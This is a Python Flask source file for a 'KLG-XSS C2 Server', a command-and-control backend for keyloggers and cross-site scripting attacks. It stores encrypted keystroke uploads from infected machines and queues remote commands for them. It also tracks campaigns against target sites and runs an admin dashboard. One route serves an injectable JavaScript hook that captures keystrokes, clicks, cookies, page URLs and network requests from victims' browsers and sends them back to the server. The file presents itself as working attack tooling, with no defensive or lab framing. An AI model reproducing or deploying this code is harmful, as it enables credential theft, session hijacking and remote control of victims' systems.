import os
import json
import base64
import threading
import time
import hashlib
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional
from flask import Flask, request, jsonify, send_file, render_template_string
from cryptography.fernet import Fernet
import sqlite3

app = Flask(__name__)

DB_PATH = Path.home() / ".c2_data" / "c2.db"
DB_PATH.parent.mkdir(parents=True, exist_ok=True)
ENCRYPTION_KEY = os.getenv('C2_KEY') or Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

keylogger_sessions: Dict[str, Dict] = {}
xss_hooks: Dict[str, Dict] = {}
active_tasks: Dict[str, Dict] = {}

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keylogger_events
                 (id INTEGER PRIMARY KEY, session_id TEXT, timestamp TEXT, event_type TEXT, 
                  window TEXT, data TEXT, raw_data BLOB)''')
    c.execute('''CREATE TABLE IF NOT EXISTS xss_checkins
                 (id INTEGER PRIMARY KEY, hook_id TEXT, timestamp TEXT, source_ip TEXT,
                  data_type TEXT, data TEXT, raw_data BLOB)''')
    c.execute('''CREATE TABLE IF NOT EXISTS campaigns
                 (id TEXT PRIMARY KEY, name TEXT, created TEXT, status TEXT, data TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (id TEXT PRIMARY KEY, session_id TEXT, command TEXT, status TEXT, 
                  result TEXT, created TEXT, completed TEXT)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def index():
    return jsonify({
        'service': 'KLG-XSS C2 Server',
        'version': '1.0',
        'status': 'running',
        'endpoints': {
            'keylogger': '/api/keylogger/*',
            'xss': '/api/xss/*',
            'hooks': '/hook/*',
            'admin': '/admin/*'
        }
    })

@app.route('/api/keylogger/upload', methods=['POST'])
def keylogger_upload():
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        payload_b64 = data.get('payload')
        
        if not session_id or not payload_b64:
            return jsonify({'error': 'Missing session_id or payload'}), 400
        
        encrypted = base64.b64decode(payload_b64)
        decrypted = cipher.decrypt(encrypted)
        payload = json.loads(decrypted.decode())
        
        if session_id not in keylogger_sessions:
            keylogger_sessions[session_id] = {
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'event_count': 0,
                'events': []
            }
        
        session = keylogger_sessions[session_id]
        session['last_seen'] = datetime.now().isoformat()
        session['event_count'] += payload.get('count', 0)
        session['events'].extend(payload.get('events', []))
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        for event in payload.get('events', []):
            c.execute('''INSERT INTO keylogger_events 
                         (session_id, timestamp, event_type, window, data, raw_data)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (session_id, event.get('timestamp'), event.get('type'),
                       event.get('window'), json.dumps(event.get('data')), 
                       json.dumps(event).encode()))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'ok', 'received': payload.get('count', 0)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/keylogger/sessions', methods=['GET'])
def keylogger_sessions_list():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT session_id, MIN(timestamp) as first_seen, MAX(timestamp) as last_seen, 
                        COUNT(*) as event_count
                 FROM keylogger_events GROUP BY session_id ORDER BY last_seen DESC''')
    sessions = []
    for row in c.fetchall():
        sessions.append({
            'session_id': row[0],
            'first_seen': row[1],
            'last_seen': row[2],
            'event_count': row[3]
        })
    conn.close()
    return jsonify({'sessions': sessions})

@app.route('/api/keylogger/sessions/<session_id>', methods=['GET'])
def keylogger_session_detail(session_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT timestamp, event_type, window, data FROM keylogger_events 
                 WHERE session_id = ? ORDER BY timestamp''', (session_id,))
    events = []
    for row in c.fetchall():
        events.append({
            'timestamp': row[0],
            'type': row[1],
            'window': row[2],
            'data': json.loads(row[3]) if row[3] else {}
        })
    conn.close()
    return jsonify({'session_id': session_id, 'events': events})

@app.route('/api/keylogger/sessions/<session_id>/export', methods=['GET'])
def keylogger_export(session_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT timestamp, event_type, window, data FROM keylogger_events 
                 WHERE session_id = ? ORDER BY timestamp''', (session_id,))
    events = []
    for row in c.fetchall():
        events.append({
            'timestamp': row[0],
            'type': row[1],
            'window': row[2],
            'data': json.loads(row[3]) if row[3] else {}
        })
    conn.close()
    
    export_data = {
        'session_id': session_id,
        'exported': datetime.now().isoformat(),
        'events': events
    }
    
    from flask import Response
    return Response(
        json.dumps(export_data, indent=2),
        mimetype='application/json',
        headers={'Content-Disposition': f'attachment; filename=keylogger_{session_id}.json'}
    )

@app.route('/api/xss/register_hook', methods=['POST'])
def xss_register_hook():
    try:
        data = request.get_json()
        hook_id = data.get('hook_id')
        payload = data.get('payload')
        
        if not hook_id or not payload:
            return jsonify({'error': 'Missing hook_id or payload'}), 400
        
        xss_hooks[hook_id] = {
            'payload': payload,
            'created': datetime.now().isoformat(),
            'checkins': []
        }
        return jsonify({'status': 'ok', 'hook_id': hook_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/hook/<hook_id>', methods=['GET', 'POST'])
def xss_hook_checkin(hook_id):
    try:
        if hook_id not in xss_hooks:
            xss_hooks[hook_id] = {'checkins': []}
        
        checkin_data = {}
        if request.method == 'GET':
            checkin_data = dict(request.args)
        else:
            checkin_data = request.get_json() or dict(request.form)
        
        source_ip = request.remote_addr
        checkin = {
            'timestamp': datetime.now().isoformat(),
            'source_ip': source_ip,
            'method': request.method,
            'data': checkin_data,
            'headers': dict(request.headers)
        }
        
        xss_hooks[hook_id]['checkins'].append(checkin)
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO xss_checkins 
                     (hook_id, timestamp, source_ip, data_type, data, raw_data)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (hook_id, checkin['timestamp'], source_ip, 
                   list(checkin_data.keys())[0] if checkin_data else 'unknown',
                   json.dumps(checkin_data), json.dumps(checkin).encode()))
        conn.commit()
        conn.close()
        
        return '', 204
    except Exception as e:
        return str(e), 500

@app.route('/hook/<hook_id>.js', methods=['GET'])
def xss_hook_js(hook_id):
    js_payload = f"""
(function() {{
    var hookId = '{hook_id}';
    var c2Url = '{request.url_root}hook/' + hookId;
    
    function exfiltrate(data) {{
        var img = new Image();
        img.src = c2Url + '?data=' + encodeURIComponent(JSON.stringify(data));
    }}
    
    document.addEventListener('keydown', function(e) {{
        exfiltrate({{type: 'keystroke', key: e.key, target: e.target.tagName}});
    }});
    
    document.addEventListener('click', function(e) {{
        exfiltrate({{type: 'click', x: e.clientX, y: e.clientY, target: e.target.tagName}});
    }});
    
    exfiltrate({{type: 'init', url: window.location.href, cookie: document.cookie, ua: navigator.userAgent}});
    
    setInterval(function() {{
        exfiltrate({{type: 'heartbeat', cookie: document.cookie}});
    }}, 30000);
    
    var originalFetch = window.fetch;
    window.fetch = function() {{
        exfiltrate({{type: 'fetch', url: arguments[0]}});
        return originalFetch.apply(this, arguments);
    }};
    
    var originalXHR = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function() {{
        exfiltrate({{type: 'xhr', method: arguments[0], url: arguments[1]}});
        return originalXHR.apply(this, arguments);
    }};
}})();
"""
    return js_payload, 200, {'Content-Type': 'application/javascript'}

@app.route('/api/xss/hooks', methods=['GET'])
def xss_hooks_list():
    hooks = []
    for hook_id, data in xss_hooks.items():
        hooks.append({
            'hook_id': hook_id,
            'created': data.get('created'),
            'checkin_count': len(data.get('checkins', [])),
            'last_checkin': data['checkins'][-1]['timestamp'] if data.get('checkins') else None
        })
    return jsonify({'hooks': hooks})

@app.route('/api/xss/hooks/<hook_id>', methods=['GET'])
def xss_hook_detail(hook_id):
    hook = xss_hooks.get(hook_id)
    if not hook:
        return jsonify({'error': 'Hook not found'}), 404
    return jsonify({'hook_id': hook_id, 'checkins': hook.get('checkins', [])})

@app.route('/api/xss/campaigns', methods=['POST'])
def xss_create_campaign():
    try:
        data = request.get_json()
        name = data.get('name', f'campaign_{int(time.time())}')
        targets = data.get('targets', [])
        payload_types = data.get('payload_types', ['reflected', 'stored', 'dom'])
        
        campaign_id = hashlib.md5(f"{name}{time.time()}".encode()).hexdigest()[:12]
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO campaigns (id, name, created, status, data) VALUES (?, ?, ?, ?, ?)''',
                  (campaign_id, name, datetime.now().isoformat(), 'pending', 
                   json.dumps({'targets': targets, 'payload_types': payload_types})))
        conn.commit()
        conn.close()
        
        return jsonify({'campaign_id': campaign_id, 'status': 'created'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/tasks', methods=['POST'])
def create_task():
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        command = data.get('command')
        
        if not session_id or not command:
            return jsonify({'error': 'Missing session_id or command'}), 400
        
        task_id = hashlib.md5(f"{session_id}{command}{time.time()}".encode()).hexdigest()[:12]
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO tasks (id, session_id, command, status, created) VALUES (?, ?, ?, ?, ?)''',
                  (task_id, session_id, command, 'pending', datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        active_tasks[task_id] = {
            'session_id': session_id,
            'command': command,
            'status': 'pending',
            'created': datetime.now().isoformat()
        }
        
        return jsonify({'task_id': task_id, 'status': 'pending'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/tasks/<session_id>', methods=['GET'])
def get_tasks(session_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT id, command, status, result, created, completed FROM tasks 
                 WHERE session_id = ? ORDER BY created DESC''', (session_id,))
    tasks = []
    for row in c.fetchall():
        tasks.append({
            'task_id': row[0],
            'command': row[1],
            'status': row[2],
            'result': row[3],
            'created': row[4],
            'completed': row[5]
        })
    conn.close()
    return jsonify({'tasks': tasks})

@app.route('/api/tasks/<task_id>/result', methods=['POST'])
def submit_task_result(task_id):
    try:
        data = request.get_json()
        result = data.get('result', '')
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''UPDATE tasks SET status = ?, result = ?, completed = ? WHERE id = ?''',
                  ('completed', result, datetime.now().isoformat(), task_id))
        conn.commit()
        conn.close()
        
        if task_id in active_tasks:
            active_tasks[task_id]['status'] = 'completed'
            active_tasks[task_id]['result'] = result
            active_tasks[task_id]['completed'] = datetime.now().isoformat()
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/admin')
def admin_panel():
    html = """
<!DOCTYPE html>
<html><head><title>KLG-XSS C2 Admin</title>
<style>
body{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:0;padding:20px}
h1{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:10px}
.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:15px;margin:10px 0}
table{width:100%;border-collapse:collapse}
th,td{padding:8px;text-align:left;border-bottom:1px solid #30363d}
th{color:#58a6ff}
code{background:#21262d;padding:2px 4px;border-radius:3px}
.btn{background:#238636;border:none;color:#fff;padding:6px 12px;border-radius:4px;cursor:pointer}
.btn:hover{background:#2ea043}
.btn-danger{background:#da3633}
.btn-danger:hover{background:#f85149}
input,select{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:6px;border-radius:4px}
</style></head><body>
<h1>KLG-XSS C2 Administration</h1>
<div class="card"><h3>Keylogger Sessions</h3><div id="klg-sessions">Loading...</div></div>
<div class="card"><h3>XSS Hooks</h3><div id="xss-hooks">Loading...</div></div>
<div class="card"><h3>Campaigns</h3><div id="campaigns">Loading...</div></div>
<script>
async function loadData() {
    const [klg, hooks, camps] = await Promise.all([
        fetch('/api/keylogger/sessions').then(r=>r.json()),
        fetch('/api/xss/hooks').then(r=>r.json()),
        fetch('/api/xss/campaigns').then(r=>r.json()).catch(()=>({campaigns:[]}))
    ]);
    
    document.getElementById('klg-sessions').innerHTML = renderTable(klg.sessions || [], ['session_id','first_seen','last_seen','event_count']);
    document.getElementById('xss-hooks').innerHTML = renderTable(hooks.hooks || [], ['hook_id','created','checkin_count','last_checkin']);
    document.getElementById('campaigns').innerHTML = renderTable(camps.campaigns || [], ['id','name','created','status']);
}
function renderTable(data, cols) {
    if(!data.length) return '<p>No data</p>';
    let html = '<table><tr>' + cols.map(c=>'<th>'+c+'</th>').join('') + '</tr>';
    data.forEach(row => {
        html += '<tr>' + cols.map(c=>'<td>'+(row[c]||'')+'</td>').join('') + '</tr>';
    });
    return html + '</table>';
}
loadData();
setInterval(loadData, 5000);
</script></body></html>
"""
    return html

@app.route('/api/xss/campaigns', methods=['GET'])
def xss_campaigns_list():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT id, name, created, status FROM campaigns ORDER BY created DESC''')
    campaigns = []
    for row in c.fetchall():
        campaigns.append({'id': row[0], 'name': row[1], 'created': row[2], 'status': row[3]})
    conn.close()
    return jsonify({'campaigns': campaigns})

def run_server(host='0.0.0.0', port=8080, debug=False):
    app.run(host=host, port=port, debug=debug, threaded=True)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=8080)
    parser.add_argument('--debug', action='store_true')
    args = parser.parse_args()
    run_server(args.host, args.port, args.debug)